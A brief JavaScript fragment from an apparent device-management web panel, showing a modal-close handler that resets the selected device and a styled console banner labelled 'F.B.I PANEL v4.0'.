        o.classList.remove('open');
        if(o.id === 'deviceModal'){ selDev = null; activeDeviceUid = null; stopMP(); }
      }
    });
  });
...
console.log('%c[F.B.I PANEL] v4.0 ⚡ CACHE-FREE FAST BOOT · ACTIVE-DEVICE LOCK', 'color:#a855f7;font-weight:bold;font-size:14px');
